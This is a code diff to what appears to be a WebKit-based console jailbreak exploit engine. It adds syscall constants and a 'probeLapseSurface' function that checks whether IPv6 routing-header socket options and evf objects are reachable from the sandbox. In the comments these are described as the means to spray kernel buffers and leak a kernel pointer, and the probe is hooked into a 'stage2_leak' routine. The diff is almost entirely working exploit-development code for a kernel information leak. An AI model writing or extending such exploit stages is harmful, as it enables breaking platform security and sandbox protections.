@@ -72,6 +72,17 @@ const SYS_SOCKETPAIR     = 0x035;
 const AIO_CMD_MULTI_READ = 0x1001;
 const SYS_SETSOCKOPT     = 0x069;
 const SYS_GETSOCKOPT     = 0x076;
+const SYS_EVF_CREATE     = 0x21A;
+const SYS_EVF_DELETE     = 0x21B;
+const SYS_EVF_SET        = 0x220;
+const SYS_EVF_CLEAR      = 0x221;
+const IPPROTO_IPV6       = 41;
+const IPV6_RTHDR         = 51;
+const IPV6_TCLASS        = 61;
+const AF_INET6           = 28;
+const AF_INET            = 2;
+const SOCK_STREAM        = 1;
+const SOCK_DGRAM         = 2;
 const SYS_MMAP           = 0x1DD;
 const SYS_MUNMAP         = 0x049;
 const SYS_NANOSLEEP      = 0x0F0;
@@ -1041,6 +1052,76 @@ export function makeBagagwaEngine(X) {
         return out;
     }
 
+    // Lapse-port surface gate. lapse.js's leak is built entirely on IPv6
+    // sockets: socket(AF_INET6) + setsockopt/getsockopt(IPV6_RTHDR) sprays a
+    // controlled kernel buffer, then aliases it with evf objects to leak a
+    // kernel pointer. If those are EPERM in this WebKit sandbox (socketpair
+    // already is), the lapse route is unbuildable here and we must use the
+    // waker-decrement route instead. One-run go/no-go, never throws.
+    async function probeLapseSurface() {
+        const res = { socket6: null, socket4: null, rthdrSet: null, rthdrGet: null, evf: null };
+        try {
+            const s6 = await sys(SYS_SOCKET, AF_INET6, SOCK_DGRAM, 0);
+            res.socket6 = s6.failed ? s6.errText : ("fd=" + s6.s32);
+            note("[LAPSE-PROBE] socket(AF_INET6,SOCK_DGRAM,0) -> " + (s6.failed ? s6.errText : "ok fd=" + s6.s32));
+
+            const s4 = await sys(SYS_SOCKET, AF_INET, SOCK_STREAM, 0);
+            res.socket4 = s4.failed ? s4.errText : ("fd=" + s4.s32);
+            note("[LAPSE-PROBE] socket(AF_INET,SOCK_STREAM,0) -> " + (s4.failed ? s4.errText : "ok fd=" + s4.s32));
+
+            if (!s6.failed) {
+                const rbuf = safeAlloc(0x80, "lapse-rthdr");
+                const lenb = safeAlloc(4, "lapse-optlen");
+                if (rbuf && lenb) {
+                    // minimal rthdr header; malformed -> EINVAL if reachable,
+                    // EPERM/ENOTCAPABLE if blocked by the sandbox.
+                    write8(rbuf.u8, 0, 0);
+                    write8(rbuf.u8, 1, 0x0f);
+                    write8(rbuf.u8, 2, 0);
+                    write8(rbuf.u8, 3, 0);
+                    const st = await sys(SYS_SETSOCKOPT, s6.s32, IPPROTO_IPV6, IPV6_RTHDR, rbuf.base, 0x80);
+                    res.rthdrSet = st.failed ? st.errText : "ok";
+                    note("[LAPSE-PROBE] setsockopt(IPV6_RTHDR) -> " + (st.failed ? st.errText : "ok"));
+                    w32(lenb.u8, 0, 0x80);
+                    const gt = await sys(SYS_GETSOCKOPT, s6.s32, IPPROTO_IPV6, IPV6_RTHDR, rbuf.base, lenb.base);
+                    res.rthdrGet = gt.failed ? gt.errText : "ok";
+                    note("[LAPSE-PROBE] getsockopt(IPV6_RTHDR) -> " + (gt.failed ? gt.errText : "ok"));
+                }
+                await sys(SYS_CLOSE, s6.s32);
+            }
+            if (!s4.failed) await sys(SYS_CLOSE, s4.s32);
+
+            const nameBuf = safeAlloc(8, "lapse-evfname");
+            if (nameBuf) {
+                const nm = "lapse0";
+                for (let c = 0; c < nm.length; c++) nameBuf.u8[c] = nm.charCodeAt(c);
+                nameBuf.u8[nm.length] = 0;
+                const ec = await sys(SYS_EVF_CREATE, nameBuf.base, 0, 0);
+                res.evf = ec.failed ? ec.errText : ("id=" + ec.s32);
+                note("[LAPSE-PROBE] evf_create -> " + (ec.failed ? ec.errText : "ok id=" + ec.s32));
+                if (!ec.failed) {
+                    const es = await sys(SYS_EVF_SET, ec.s32, 1);
+                    note("[LAPSE-PROBE] evf_set -> " + (es.failed ? es.errText : "ok"));
+                    const ed = await sys(SYS_EVF_DELETE, ec.s32);
+                    note("[LAPSE-PROBE] evf_delete -> " + (ed.failed ? ed.errText : "ok"));
+                }
+            }
+
+            const s6ok = !s6.failed;
+            const rthdrReachable = res.rthdrSet === "ok" || res.rthdrSet === "EINVAL";
+            const verdict = !s6ok && s4.failed
+                ? "SOCKETS BLOCKED -> lapse leak unbuildable, use waker-decrement route"
+                : (!rthdrReachable
+                    ? "sockets ok but IPV6_RTHDR blocked (" + res.rthdrSet + ")"
+                    : "LAPSE ROUTE VIABLE (sockets + IPV6 sockopts reachable)");
+            note("[LAPSE-PROBE] VERDICT: " + verdict);
+            flushMark("LAPSE-PROBE", verdict);
+        } catch (e) {
+            note("[LAPSE-PROBE] threw: " + (e && e.message ? e.message : e));
+        }
+        return res;
+    }
+
     async function stage2_leak(opts) {
         const o = opts || {};
         const out = { ok: false, why: "", steps: [], leaked: [] };
@@ -1078,6 +1159,11 @@ export function makeBagagwaEngine(X) {
         } else {
             note("syscall 727 (0x2D7) not in firmware profile — using pipe-based leak path");
         }
+
+        // 727 is absent on 13.60, so the real leak must come from the lapse
+        // route (IPv6 rthdr + evf aliasing) or the waker. Gate it here so the
+        // log tells us which route to build before the port.
+        try { await probeLapseSurface(); } catch (_) {}
 
         const pr = await setupPipes();
         if (!pr.ok) { out.why = pr.why; return out; }
